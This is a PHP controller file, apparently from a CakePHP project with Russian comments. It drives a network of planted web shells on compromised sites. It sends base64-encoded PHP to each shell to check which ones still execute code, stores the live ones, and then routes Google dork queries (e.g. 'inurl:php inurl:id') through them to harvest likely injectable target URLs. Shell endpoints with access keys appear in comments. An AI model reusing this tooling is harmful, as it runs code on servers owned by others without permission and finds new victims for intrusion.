<?php
ini_set("memory_limit","388M");
set_time_limit(0);
//imp('Injector');
error_reporting(0);
ignore_user_abort(true);

class YakeysController extends AppController {
	
	var $name ='Yakeys';
	
	var $uses = array('Yakey','Citie','Post','Gurl');
	var $helpers = array('form','html','javascript','paginator','ajax');
	var $components = array('RequestHandler','Session');
	
		
	var $paginate = array('limit' => 50);
	
	//'rk.ntlab.su/imgs/news/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG',
	//'forum.findjob.ru/avatars/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG'

	function saveurl($urls){
	
		foreach ($urls as $url){
		
			$url = str_replace('%3D', '=', $url);
			$url = str_replace('%3F', '?', $url);
			$url = str_replace('%26', '&', $url);
			//$url = str_replace('', '', $url);
			$data['Gurl']['urls'] = $url;
			$data['Gurl']['id'] = 0;
		//	echo $url.'<br>';
		//	flush();
			$this->Gurl->save($data);
			
		}
		
	}
	
	/*
	 * Get Google page
	 */
	
	function testgoogle(){
	
		$file = array('com');
		
		foreach ($file as $zone){
		
			$cool = explode(' ', $zone);
			$newzone[] = $cool[1];
		
			
		}
		
		//print_r($newzone);
		
		//die();
		$this->evaltest();
	
		//echo '<h1>Проверили шеллы</h1>';
		//flush();
		
		shuffle($this->serv);
		
		$this->serv = array('127.0.0.1/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG');
		
		//print_r($this->serv);

		//die();

		$keys = $this->Yakey->query("SELECT * FROM  `cities` LIMIT 2222,1");
		
		$domens = explode(',', 'us,de,ca,fr,it,au');

		foreach ($keys as $value){
			
			foreach ($domens as $dom)$goodkeys[] = '"'.$value['cities']['name'].'" site:'.$dom.' inurl:php inurl:id';			
		
		}
		
	//	print_r($goodkeys);
	//	die();
		//print_r($this->serv);
		
		$cmh = curl_multi_init();
 
		$tasks = array();
		
		$count_serv = count($this->serv);
		$count_keys = count($goodkeys);
		
		$servers = $this->serv;
		
		$code = str_replace('urlproxyfile', "'".urlproxyfile."'", file_get_contents('google.php'));
		$this->code = str_replace(array('<?php','?>'), '', $code);

		//echo $newzone[array_rand($newzone)];
		//die();

		for($i=0;$i<1;$i++){
			

	
			$kk = array_shift($goodkeys);
			$ss = array_shift($servers);
					
			$ch = $this->streamSHells($ss,$kk,'com');

			$tasks[$kk.':::'.$ss] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
			//break;
		}
		
	

		$active = null;


		do {
			
			$mrc = curl_multi_exec($cmh, $active);
		}

		while ($mrc == CURLM_CALL_MULTI_PERFORM);
 
		while ($active && ($mrc == CURLM_OK)) {
	
	
			if (curl_multi_select($cmh) != -1) {
		
		do {
			
			$mrc = curl_multi_exec($cmh, $active);

			$info = curl_multi_info_read($cmh);

			if ($info['msg'] == CURLMSG_DONE) {
				$ch = $info['handle'];
	
				$url = array_search($ch, $tasks);
			
				$tasks[$url] = curl_multi_getcontent($ch);
			
				$dann = explode(':::', $url);
				if(strstr($tasks[$url], 'bedaaa')){
					
					echo '<H1>БЕДА!!!!!У НАС КАПЧА</H1>';
					file_put_contents('kapchaaaaaa.txt', $dann[1].'
					'.$tasks[$url]);

					
					
				}else{
					
	//header('Content-Type: image/jpeg');
					
				echo $tasks[$url];
				die();
				//die();
				$get = base64_decode($tasks[$url]);
				

				
				$file = unserialize($get);

			//	print_r($file);
				
			//	die();
			
				//$this->$file
				//$this->saveurl($file);
				
				echo $url.'<br/>';
				flush();

	
				}

					curl_multi_remove_handle($cmh, $ch);
				
					curl_close($ch);
					
					
			
			if(count($goodkeys)>0){
		
				if(count($servers)==0)$servers = $this->serv;
				
				$kk = array_shift($goodkeys);
			$ss = array_shift($servers);
					
			//$ch = $this->streamSHells($ss,$kk,$newzone[array_rand($newzone)]);

		//	$tasks[$kk.':::'.$ss] = $ch;
		///	curl_multi_add_handle($cmh, $ch);
			
			}
			
					
			
			}
			
	
			
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);
	}
}
 
	curl_multi_close($cmh);


			list($msec, $sec) = explode(chr(32), microtime());
		echo '<h1>--'.round(($sec + $msec) - $this->timework, 4).'</h1>';
	
		die('ok');
		
		
		
		
		die();
	}
	
	
	function streamSHells($serv,$query,$zone){

			$ch = curl_init('http://'.$serv);
			
			 curl_setopt($ch, CURLOPT_URL, 'http://'.trim($serv));
			
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);
			curl_setopt($ch, CURLOPT_TIMEOUT, 400);
			curl_setopt($ch, CURLOPT_ENCODING, "UTF-8");
			curl_setopt($ch, CURLOPT_POST, 1);

			$postdata = 'query='.urlencode(base64_encode($query)).'&zone='.urlencode($zone).'&fack='.urlencode(base64_encode($this->code));			
						 
			$headers["Content-Length"] = strlen($postdata);
			$headers["User-Agent"] = "Curl/1.0";
			 	
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
			
		return $ch;
	
	}
	

	
	
	function evaltest(){
		
		if(time()-intval(filemtime('goodshelllist.txt'))>100000){
			
			$original = file('shelllist.txt');
		}else{
		
			$original = file('goodshelllist.txt');
			
			$this->serv = $original;
			return ;
			
		}
		
		shuffle($sssss);
		
//		$sssss = array_slice($original,0,200);
		
		for ($i=0;$i<200;$i++)$sssss[] = array_shift($original);
		
		##########################################################################
		$cmh = curl_multi_init();
 
		$tasks = array();
		
		$count_serv = count($sssss);
		
		for($i=0;$i<$count_serv;$i++){
			
			if(!empty($sssss[$i])){
			//echo $sssss[$i].'<br/>';
			//		flush();
			$ch = $this->evallife(trim($sssss[$i]));

			$tasks[$this->serv[$i]] = $ch;
			curl_multi_add_handle($cmh, $ch);
			}
			//break;
		}
		
	
		//echo '<h3>sssssss</h3>'; 

		$active = null;


		do {
			
			$mrc = curl_multi_exec($cmh, $active);
		}

		while ($mrc == CURLM_CALL_MULTI_PERFORM);
 
		while ($active && ($mrc == CURLM_OK)) {
	
	
			if (curl_multi_select($cmh) != -1) {
		
		do {
			
			$mrc = curl_multi_exec($cmh, $active);

			$info = curl_multi_info_read($cmh);

			if ($info['msg'] == CURLMSG_DONE) {
				$ch = $info['handle'];
	
				$url = array_search($ch, $tasks);
			
				$tasks[$url] = curl_multi_getcontent($ch);
			
				
				$get = $tasks[$url];
				
				$zz++;
				//echo $get ;
				if(strstr($tasks[$url], 'ololo')){
					
					//preg_match("~\|\|(.*?)\|\|~", $get, $urlll);
					$dd = explode("||", $get);

					$new[]= $dd[1];
					//echo $dd[1].'<br/>';
					
				}else{
				
					//echo $get.'<br>';
					
				}
				
				curl_multi_remove_handle($cmh, $ch);	
				curl_close($ch);
					
					
				if(count($original)>0){
				
					$add = trim(array_shift($original));
					$chc = $this->evallife($add);
					$tasks[$add] = $chc;
					curl_multi_add_handle($cmh, $chc);
				
					
				}
			
				//	flush();

			
			}
			
	
			
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);
	}
}
 
curl_multi_close($cmh);
		##########################################################################
		//echo '<h3>'.$zz.'</h3>';
$this->serv = $new;

unlink('goodshelllist.txt');
$fp = fopen ('goodshelllist.txt', "a+");
 
foreach ($new as $output)
{
fwrite($fp, $output."\r\n");
}
 
fclose($fp);


//print_r($new);
//die('ssss');

}

	function evallife($url){

			$ch = curl_init($url);
			
			 curl_setopt($ch, CURLOPT_URL, $url);
			
			 
			 	$agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.7.12) Gecko/20050919 Firefox/1.0.7';  



			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

			curl_setopt($ch, CURLOPT_HEADER, 1); //Включать или не включать header 
			
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

			curl_setopt($ch, CURLOPT_PROXY, $proxy); 
			
			curl_setopt($ch, CURLOPT_TIMEOUT, 10);			
			curl_setopt($ch, CURLOPT_ENCODING, "UTF-8");
			curl_setopt($ch, CURLOPT_POST, 1);
	

		 $postdata = 'fack='.urlencode(base64_encode(" echo '||".$url."|| ololo';"));

		 $headers["Content-Length"] = strlen($postdata);
		 $headers["User-Agent"] = "Curl/1.0";	
						 
			$headers["Content-Length"] = strlen($postdata);
			$headers["User-Agent"] = "Curl/1.0";
			 	
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
			
		return $ch;

	}
}	
?>